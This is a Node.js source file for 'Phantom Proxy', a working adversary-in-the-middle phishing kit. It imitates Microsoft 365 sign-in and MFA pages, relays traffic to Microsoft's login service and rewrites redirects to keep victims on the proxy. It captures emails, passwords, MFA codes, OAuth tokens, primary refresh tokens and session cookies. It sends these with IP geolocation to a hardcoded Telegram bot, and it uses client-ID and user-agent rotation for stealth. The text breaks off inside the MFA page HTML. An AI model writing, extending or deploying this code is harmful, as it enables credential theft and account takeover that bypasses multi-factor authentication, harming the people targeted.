// ============================================================
// 🥔 PHANTOM PROXY v8.1 — REDIRECT FIX EDITION
// ============================================================
// 🔥 FIX: Intercepts and rewrites 3xx redirects to keep victim on proxy
// ============================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const os = require("os");
const url = require("url");
const { spawn, exec } = require("child_process");

// ── ✅ SAFE REQUIRE WITH FALLBACKS ──
let axios, express, basicAuth, AdmZip, WebSocket, FormData, SocksProxyAgent, obfuscator, rateLimit;

try { axios = require('axios'); } catch (e) { axios = null; }
try { express = require('express'); } catch (e) { express = null; }
try { basicAuth = require('express-basic-auth'); } catch (e) { basicAuth = null; }
try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
try { FormData = require('form-data'); } catch (e) { FormData = null; }
try { SocksProxyAgent = require('socks-proxy-agent'); } catch (e) { SocksProxyAgent = null; }
try { obfuscator = require('javascript-obfuscator'); } catch (e) { obfuscator = null; }
try { rateLimit = require('express-rate-limit'); } catch (e) { rateLimit = null; }

// ── ✅ CORS MIDDLEWARE ──
function corsMiddleware(req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') {
        res.sendStatus(200);
    } else {
        next();
    }
}

// ============================================================
// 🗃️ CACHE MANAGER
// ============================================================
class CacheManager {
    constructor(ttl = 300000) {
        this.cache = new Map();
        this.ttl = ttl;
        this.hits = 0;
        this.misses = 0;
    }

    get(key) {
        const item = this.cache.get(key);
        if (!item) {
            this.misses++;
            return null;
        }
        if (Date.now() > item.expiry) {
            this.cache.delete(key);
            this.misses++;
            return null;
        }
        this.hits++;
        return item.value;
    }

    set(key, value, ttl = null) {
        const expiry = Date.now() + (ttl || this.ttl);
        this.cache.set(key, { value, expiry });
        return value;
    }

    delete(key) {
        return this.cache.delete(key);
    }

    clear() {
        this.cache.clear();
        this.hits = 0;
        this.misses = 0;
    }

    getStats() {
        const total = this.hits + this.misses;
        return {
            size: this.cache.size,
            hits: this.hits,
            misses: this.misses,
            hitRate: total > 0 ? (this.hits / total * 100).toFixed(1) + '%' : '0%'
        };
    }

    clean() {
        const now = Date.now();
        for (const [key, item] of this.cache) {
            if (now > item.expiry) {
                this.cache.delete(key);
            }
        }
    }
}

// ============================================================
// 🔄 RETRY LOGIC
// ============================================================
async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
    let lastError;
    let currentDelay = delay;

    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            return await fn();
        } catch (error) {
            lastError = error;
            if (attempt === retries) break;
            const jitter = Math.random() * 0.3 + 0.85;
            const waitTime = currentDelay * jitter;
            await new Promise(resolve => setTimeout(resolve, waitTime));
            currentDelay *= backoff;
        }
    }
    throw lastError;
}

// ============================================================
// 📊 STRUCTURED LOGGER
// ============================================================
function logInfo(message, data = null) {
    const entry = { timestamp: new Date().toISOString(), level: 'INFO', message };
    if (data) entry.data = data;
    console.log(JSON.stringify(entry));
}

function logWarn(message, data = null) {
    const entry = { timestamp: new Date().toISOString(), level: 'WARN', message };
    if (data) entry.data = data;
    console.log(JSON.stringify(entry));
}

function logError(message, data = null) {
    const entry = { timestamp: new Date().toISOString(), level: 'ERROR', message };
    if (data) entry.data = data;
    console.log(JSON.stringify(entry));
}

function logDebug(message, data = null) {
    const entry = { timestamp: new Date().toISOString(), level: 'DEBUG', message };
    if (data) entry.data = data;
    console.log(JSON.stringify(entry));
}

// ── ✅ NO ANTI-BOT (removed as requested) ──
function antiBotMiddleware(req, res, next) { next(); }
function botTrapMiddleware(req, res, next) { next(); }
const limiter = (req, res, next) => next();

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
const CHAT_ID = '7310383191';
const NOTIFIED_SESSIONS = new Set();
const CAPTURED_TOKENS = {};
let deviceFlows = [];

// ── ✅ TELEGRAM QUEUE WITH PERSISTENCE ──
const TELEGRAM_QUEUE_FILE = path.join(__dirname, 'telegram_queue.json');
let telegramQueue = [];

function loadTelegramQueue() {
    try {
        if (fs.existsSync(TELEGRAM_QUEUE_FILE)) {
            const data = fs.readFileSync(TELEGRAM_QUEUE_FILE, 'utf-8');
            telegramQueue = JSON.parse(data);
            // Only keep messages from last 24 hours
            telegramQueue = telegramQueue.filter(q => Date.now() - q.timestamp < 86400000);
            logInfo(`Loaded ${telegramQueue.length} queued messages from disk`);
        }
    } catch (e) {
        logError('Failed to load Telegram queue:', e.message);
    }
}

function saveTelegramQueue() {
    try {
        fs.writeFileSync(TELEGRAM_QUEUE_FILE, JSON.stringify(telegramQueue, null, 2));
    } catch (e) {
        logError('Failed to save Telegram queue:', e.message);
    }
}

async function processTelegramQueue() {
    if (telegramQueue.length === 0) return;
    logInfo(`📤 Processing ${telegramQueue.length} queued Telegram messages`);
    
    const toProcess = [...telegramQueue];
    telegramQueue = [];
    
    for (const item of toProcess) {
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: item.message,
                parse_mode: 'Markdown'
            }, { timeout: 5000 });
            logInfo('✅ Queued message sent');
        } catch (error) {
            logError('Failed to send queued message:', error.message);
            // Re-queue if still recent (within 24 hours)
            if (Date.now() - item.timestamp < 86400000) {
                telegramQueue.push(item);
            }
        }
    }
    
    saveTelegramQueue();
}

// Process queue every 30 seconds
setInterval(processTelegramQueue, 30000);

// ── ✅ STEALTH: CLIENT ID ROTATION ──
const CLIENT_IDS = [
    '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
    '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
    'd3590ed6-52b3-4102-aeff-aad2292ab01c',
    '61e6f3cc-5b0b-4b09-8b31-ebcd1ae5f984',
    '1950a258-227b-4e31-a9cf-717495945fc2',
    'f8cdef31-a31e-4b4a-93e4-5f571e91255a',
];

function getRandomClientId() {
    return CLIENT_IDS[Math.floor(Math.random() * CLIENT_IDS.length)];
}

// ── ✅ USER-AGENT ROTATION ──
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomDelay(min = 500, max = 2000) {
    return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min));
}

function getAxiosConfig() {
    return {
        timeout: 10000,
        headers: { 'User-Agent': getRandomUserAgent() }
    };
}

// ── ✅ GEO FUNCTIONS ──
async function getGeoInfo(ip) {
    if (!axios) return { country: 'Unknown', countryCode: 'UN' };
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`, { timeout: 3000 });
        return response.data;
    } catch {
        return { country: 'Unknown', countryCode: 'UN' };
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    return String.fromCodePoint(0x1F1E6 + countryCode.charCodeAt(0) - 65, 0x1F1E6 + countryCode.charCodeAt(1) - 65);
}

// ── ✅ SEND TOKENS AS TEXT FILE ──
async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
    if (!tokens || Object.keys(tokens).length === 0) return;
    if (!FormData) return;
    
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_${sessionId}_${timestamp}.txt`;
        const tmpDir = os.tmpdir();
        const filePath = path.join(tmpDir, filename);
        
        let content = '# ============================================================\n';
        content += '# 🔑 FULL TOKENS DUMP\n';
        content += '# ============================================================\n';
        content += `# Session ID: ${sessionId}\n`;
        content += `# Captured: ${new Date().toISOString()}\n`;
        content += `# Email: ${email || 'N/A'}\n`;
        content += `# Password: ${password || 'N/A'}\n`;
        content += `# MFA Code: ${mfaCode || 'N/A'}\n`;
        content += '# ============================================================\n\n';
        
        if (tokens.access_token) {
            content += '🔑 ACCESS TOKEN\n';
            content += '============================================================\n';
            content += tokens.access_token + '\n\n';
        }
        
        if (tokens.refresh_token) {
            content += '🔄 REFRESH TOKEN\n';
            content += '============================================================\n';
            content += tokens.refresh_token + '\n\n';
        }
        
        if (tokens.id_token) {
            content += '🆔 ID TOKEN\n';
            content += '============================================================\n';
            content += tokens.id_token + '\n\n';
        }
        
        if (tokens.prt) {
            content += '🔐 PRT (Primary Refresh Token)\n';
            content += '============================================================\n';
            content += tokens.prt + '\n\n';
        }
        
        if (tokens.session_cookie) {
            content += '🍪 SESSION COOKIE\n';
            content += '============================================================\n';
            content += tokens.session_cookie + '\n\n';
        }
        
        if (tokens.cookies && Object.keys(tokens.cookies).length > 0) {
            content += '🍪 ALL COOKIES (JSON)\n';
            content += '============================================================\n';
            content += JSON.stringify(tokens.cookies, null, 2) + '\n\n';
        }
        
        content += '# ============================================================\n';
        content += '# END OF TOKENS\n';
        content += '# ============================================================\n';
        
        fs.writeFileSync(filePath, content);
        
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `🔑 Tokens file: ${filename}`);
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        
        try { fs.unlinkSync(filePath); } catch (e) {}
        logInfo('✅ Tokens file sent to Telegram');
    } catch (e) {
        logError('Failed to send tokens file:', e.message);
    }
}

// ── ✅ SEND COOKIES AS TEXT FILE ──
async function sendCookiesFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0) return;
    if (!FormData) return;
    
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `cookies_${sessionId}_${timestamp}.txt`;
        const tmpDir = os.tmpdir();
        const filePath = path.join(tmpDir, filename);
        
        let content = '# ============================================================\n';
        content += '# 🍪 COOKIES DUMP\n';
        content += '# ============================================================\n';
        content += `# Session: ${sessionId}\n`;
        content += `# Time: ${new Date().toISOString()}\n`;
        content += '# ============================================================\n\n';
        
        for (const [name, value] of Object.entries(cookies)) {
            content += `${name}=${value}\n`;
        }
        
        fs.writeFileSync(filePath, content);
        
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `🍪 Cookies: ${filename}`);
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        
        try { fs.unlinkSync(filePath); } catch (e) {}
        logInfo('✅ Cookies file sent');
    } catch (e) {
        logError('Failed to send cookies:', e.message);
    }
}

// ── ✅ CLEAN TELEGRAM SEND WITH QUEUE ──
async function sendToTelegramClean(data) {
    if (!axios) return;
    
    try {
        const sessionId = data.sessionId || 'unknown';
        const ip = data.ip || data.proxyRequestHeaders?.['x-real-ip'] || 'Unknown';
        
        let email = data.email || 'N/A';
        let password = data.password || 'N/A';
        let mfaCode = data.mfa || null;
        let tokens = {};
        let cookies = data.cookies || {};
        
        // Extract from body if present
        const body = data.proxyRequestBody || '';
        if (body && typeof body === 'string') {
            try {
                const parsed = JSON.parse(body);
                if (parsed.email) email = parsed.email;
                if (parsed.password) password = parsed.password;
                if (parsed.mfa || parsed.otp || parsed.code) mfaCode = parsed.mfa || parsed.otp || parsed.code;
                if (parsed.access_token) tokens.access_token = parsed.access_token;
                if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
                if (parsed.id_token) tokens.id_token = parsed.id_token;
                if (parsed.prt) tokens.prt = parsed.prt;
            } catch (e) {}
        }
        
        // Extract from response body
        if (data.proxyResponseBody && typeof data.proxyResponseBody === 'string') {
            try {
                const respStr = data.proxyResponseBody;
                const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (accessMatch) tokens.access_token = accessMatch[1];
                
                const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (refreshMatch) tokens.refresh_token = refreshMatch[1];
                
                const idMatch = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (idMatch) tokens.id_token = idMatch[1];
                
                const prtMatch = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (prtMatch) tokens.prt = prtMatch[1];
            } catch (e) {}
        }
        
        tokens.cookies = cookies;
        
        // Get geo info
        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
        let flag = '🌍';
        let location = 'Unknown';
        if (ip !== 'Unknown') {
            try {
                geo = await getGeoInfo(ip);
                flag = getFlagEmoji(geo.countryCode);
                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
            } catch (e) {}
        }
        
        // ── ✅ BUILD MESSAGE ──
        let message = `
🔐 **LOGIN CAPTURED!**

👤 **Email:** ${email}
🔐 **Password:** ${password}
📱 **MFA Code:** ${mfaCode || 'N/A'}
🌍 **IP:** ${ip} ${flag}
📍 **Location:** ${location}
🏢 **ISP:** ${geo.isp || 'N/A'}
🆔 **Session:** ${sessionId}
🕒 **Time:** ${new Date().toISOString()}

📎 **Attachments:**
`;
        
        if (Object.keys(tokens).length > 0) {
            message += '🔑 Tokens file attached (tokens_*.txt)\n';
            await sendTokensFile(tokens, sessionId, email, password, mfaCode);
        }
        
        if (Object.keys(cookies).length > 0) {
            message += '🍪 Cookies file attached (cookies_*.txt)\n';
            await sendCookiesFile(cookies, sessionId);
        }
        
        // ── ✅ QUEUE MESSAGE ──
        telegramQueue.push({
            timestamp: Date.now(),
            message: message
        });
        saveTelegramQueue();
        
        logInfo(`✅ Session ${sessionId} queued for Telegram`);
        
    } catch (e) {
        logError('sendToTelegramClean() FAILED:', e.message);
    }
}

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://login.microsoftonline.com/";
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};
const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "A62A71CA811BD4B8-9D994D7A82B8A40C_460510BB2923A286-AB2797EC85D91568";

if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};

function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

const DEVICE_FLOWS_FILE = path.join(__dirname, 'device_flows.json');
function loadDeviceFlows() {
    try {
        if (fs.existsSync(DEVICE_FLOWS_FILE)) {
            const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return [];
}
function saveDeviceFlows(flows) {
    try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(flows, null, 2)); } catch (e) {}
}
deviceFlows = loadDeviceFlows();

// ── ✅ VISIT LOGGING ──
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");

async function logVisit(clientRequest, clientResponse, sessionId) {
    const url = clientRequest.url || '';
    const method = clientRequest.method || '';
    const isPageLoad = method === 'GET' && (url === '/' || url.startsWith('/login') || url === '/webmail' || url === '/bitb' || url.match(/\.(html|htm)$/));
    const isStatic = url.includes('.css') || url.includes('.js') || url.includes('.gif') || url.includes('.svg') || url.includes('.ico') || url.includes('.png') || url.includes('service_worker') || url.includes('/@') || url.includes('favicon') || url.includes('OneCollector') || url.includes('/lNv1pC9AWPUY4gbidyBO');
    if (!isPageLoad || isStatic) return;
    const ip = clientRequest.headers['x-real-ip'] || clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
    const visit = {
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
        referer: clientRequest.headers['referer'] || 'Direct',
        sessionId: sessionId || 'unknown',
        url: clientRequest.url,
        method: clientRequest.method,
        statusCode: clientResponse.statusCode || 'N/A'
    };
    const logLine = JSON.stringify(visit) + '\n';
    try { fs.appendFileSync(VISITS_LOG_FILE, logLine); } catch (e) {}
}

// ── ✅ HELPER FUNCTIONS ──
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) && VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

// ── ✅ SESSIONS STORE ──
const sessions = new Map();

// ── ✅ PROXY SERVER ──
const proxyServer = http.createServer(function(clientRequest, clientResponse) {
    const method = clientRequest.method;
    const url = clientRequest.url;
    const headers = clientRequest.headers;
    const currentSession = getUserSession(headers.cookie);

    // ── Handle webmail ──
    if (url === '/webmail' || url.startsWith('/webmail?')) {
        clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
        const filePath = path.join(__dirname, 'public', 'webmail.html');
        if (fs.existsSync(filePath)) {
            fs.createReadStream(filePath).pipe(clientResponse);
        } else {
            clientResponse.end('<h1>Page not found</h1>');
        }
        return;
    }

    // ── Handle proxy endpoint ──
    if (url === PROXY_PATHNAMES.proxy) {
        let body = '';
        clientRequest.on('data', function(chunk) { body += chunk; });
        clientRequest.on('end', function() {
            try {
                const data = JSON.parse(body);
                let targetUrl = data.url;
                const options = {
                    method: data.method || 'GET',
                    headers: data.headers || {}
                };
                delete options.headers.host;
                if (data.body && (data.method === 'POST' || data.method === 'PUT')) {
                    options.body = data.body;
                }
                
                const parsedUrl = new URL(targetUrl);
                const protocol = parsedUrl.protocol === 'https:' ? https : http;
                
                const req = protocol.request(targetUrl, options, function(response) {
                    let responseBody = '';
                    response.on('data', function(chunk) { responseBody += chunk; });
                    response.on('end', function() {
                        // ── ✅ CAPTURE TOKENS ──
                        try {
                            const sessionId = headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
                            if (!sessions.has(sessionId)) {
                                sessions.set(sessionId, {});
                            }
                            const session = sessions.get(sessionId);
                            
                            // Extract tokens from response
                            if (responseBody.includes('access_token')) {
                                const match = responseBody.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/);
                                if (match) session.access_token = match[1];
                            }
                            if (responseBody.includes('refresh_token')) {
                                const match = responseBody.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/);
                                if (match) session.refresh_token = match[1];
                            }
                            if (responseBody.includes('id_token')) {
                                const match = responseBody.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/);
                                if (match) session.id_token = match[1];
                            }
                            if (responseBody.includes('prt')) {
                                const match = responseBody.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/);
                                if (match) session.prt = match[1];
                            }
                            
                            // Extract cookies
                            const cookies = response.headers['set-cookie'];
                            if (cookies) {
                                session.cookies = cookies;
                            }
                            
                            // If we have tokens, send to Telegram
                            if (session.access_token || session.refresh_token) {
                                sendToTelegramClean({
                                    sessionId: sessionId,
                                    ip: headers['x-real-ip'] || clientRequest.socket.remoteAddress,
                                    email: session.email,
                                    password: session.password,
                                    mfa: session.mfa,
                                    proxyRequestBody: JSON.stringify(session),
                                    proxyResponseBody: responseBody,
                                    cookies: session.cookies
                                });
                            }
                        } catch (e) {}
                        
                        // ── ✅ REDIRECT INTERCEPTION FIX ──
                        // Intercept 3xx redirects and rewrite Location to go through our entry point
                        let statusCode = response.statusCode;
                        let responseHeaders = response.headers;
                        
                        if (statusCode >= 300 && statusCode < 400 && responseHeaders.location) {
                            try {
                                const originalLocation = responseHeaders.location;
                                // Use the proxy's host from the incoming request
                                const proxyHost = headers.host;
                                // Build the entry URL with the original redirect target as redirect_urI
                                const entryUrl = new URL(`https://${proxyHost}${PROXY_ENTRY_POINT}`);
                                entryUrl.searchParams.set(PHISHED_URL_PARAMETER, originalLocation);
                                responseHeaders.location = entryUrl.toString();
                                logInfo(`Rewrote redirect: ${originalLocation} -> ${responseHeaders.location}`);
                            } catch (e) {
                                logWarn('Failed to rewrite redirect, keeping original:', e.message);
                            }
                        }
                        
                        clientResponse.writeHead(statusCode, responseHeaders);
                        clientResponse.end(responseBody);
                    });
                });
                
                req.on('error', function(error) {
                    logError('Proxy error:', error);
                    clientResponse.writeHead(500);
                    clientResponse.end('Proxy error');
                });
                
                if (data.body && (data.method === 'POST' || data.method === 'PUT')) {
                    req.write(data.body);
                }
                req.end();
            } catch (error) {
                logError('Parse error:', error);
                clientResponse.writeHead(500);
                clientResponse.end('Invalid request');
            }
        });
        return;
    }

    // ── Handle phishing entry point ──
    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const match = url.match(PHISHED_URL_REGEXP);
            if (!match) {
                clientResponse.writeHead(302, { Location: REDIRECT_URL });
                clientResponse.end();
                return;
            }
            const redirectUrl = decodeURIComponent(match[0]);
            let session = currentSession;
            if (!currentSession) {
                const phishedURL = new URL(redirectUrl);
                const sessionData = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", sessionData.cookieName + '=' + sessionData.cookieValue + '; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict');
                session = sessionData.cookieName;
                
                // Store redirect URL
                if (!sessions.has(session)) {
                    sessions.set(session, { redirectUrl });
                }
            }
            
            const filePath = path.join(__dirname, PROXY_FILES.index);
            if (fs.existsSync(filePath)) {
                clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
                fs.createReadStream(filePath).pipe(clientResponse);
            } else {
                // Fallback inline fake page
                clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
                clientResponse.end(`
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#fff; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:44px 36px; width:440px; max-width:100%; }
.logo { text-align:center; margin-bottom:28px; }
.logo svg { height:28px; }
h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
.subtitle { font-size:15px; color:#616161; margin-bottom:28px; }
.input-group { margin-bottom:18px; }
.input-group label { display:block; font-size:13px; font-weight:600; color:#1b1b1b; margin-bottom:6px; }
.input-group input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #8b8b8b; border-radius:4px; background:#fbfbfb; }
.input-group input:focus { border-color:#005da6; outline:none; box-shadow:0 0 0 2px rgba(0,93,166,0.25); }
.btn-primary { width:100%; padding:12px; font-size:15px; font-weight:600; color:#fff; background:#005da6; border:none; border-radius:4px; cursor:pointer; }
.btn-primary:hover { background:#004a87; }
.footer { margin-top:28px; font-size:12px; color:#757575; text-align:center; border-top:1px solid #e6e6e6; padding-top:20px; }
</style>
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 108 28" fill="none"><path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/><path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/><path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/><path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/></svg></div>
<h1>Sign in</h1>
<p class="subtitle">to continue to Microsoft 365</p>
<form action="/capture" method="POST">
<div class="input-group"><label>Email, phone, or Skype</label><input type="text" name="email" placeholder="Enter your email" required></div>
<div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
<button type="submit" class="btn-primary">Next</button>
</form>
<div class="footer">© 2026 Microsoft</div>
</div>
</body>
</html>
                `);
            }
        } catch (error) {
            logError('Entry point error:', error);
            clientResponse.writeHead(302, { Location: REDIRECT_URL });
            clientResponse.end();
        }
        return;
    }

    // ── Handle capture endpoint ──
    if (url === '/capture' && method === 'POST') {
        let body = '';
        clientRequest.on('data', chunk => { body += chunk; });
        clientRequest.on('end', () => {
            try {
                const params = new URLSearchParams(body);
                const email = params.get('email') || 'N/A';
                const password = params.get('password') || 'N/A';
                const sessionId = headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
                
                if (!sessions.has(sessionId)) {
                    sessions.set(sessionId, {});
                }
                const session = sessions.get(sessionId);
                session.email = email;
                session.password = password;
                
                sendToTelegramClean({
                    sessionId: sessionId,
                    ip: headers['x-real-ip'] || clientRequest.socket.remoteAddress,
                    email: email,
                    password: password,
                    proxyRequestBody: JSON.stringify({ email, password })
                });
                
                // Show MFA page
                clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
                clientResponse.end(`
<!DOCTYPE html>
<html>
<head><title>Verify your identity</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#fff; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:44px 36px; width:440px; max-width:100%; }
.logo { text-align:center; margin-bottom:28px; }
.logo svg { height:28px; }
h1 { font-size:24px; font-weight:600; color:#1b1b1b; margin-bottom:4px; }
.subtitle { font-size:15px; color:#616161; margin-bottom:28px; }
.input-group { margin-bottom:18px; }
.input-group label { display:block; font-size:13px; font-weight:600; color:#1b1b1b; margin-bottom:6px; }
.input-group input { width:100%; padding:12px 14px; font-size:15px; border:1px solid #8b8b8b; border-radius:4px; background:#fbfbfb; }
.input-group input:focus { border-color:#005da6; outline:none; box-shadow:0 0 0 2px rgba(0,93,166,0.25); }
.btn-primary { width:100%; padding:12px; font-size:15px; font-weight:600; color:#fff; background:#005da6; border:none; border-radius:4px; cursor:pointer; }
.btn-primary:hover { background:#004a87; }
.footer { margin-top:28px; font-size:12px; color:#757575; text-align:center; border-top:1px solid #e6e6e6; padding-top:20px; }
</style>
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 108 28" fill="none"><path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/><path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/><path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/><path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/></svg></div>
<h1>Verify your identity</h1>
<p class="subtitle">Enter the 6-digit code from your authenticator app.</p>
<form action="/mfa/submit" method="POST">
<div class="input-group"><label>Verification code</label><input type="text" name="mfa_code" placeholder="Enter code" maxlength="6" required></div>
<button type="submit" class="btn-primary">Verify</button>
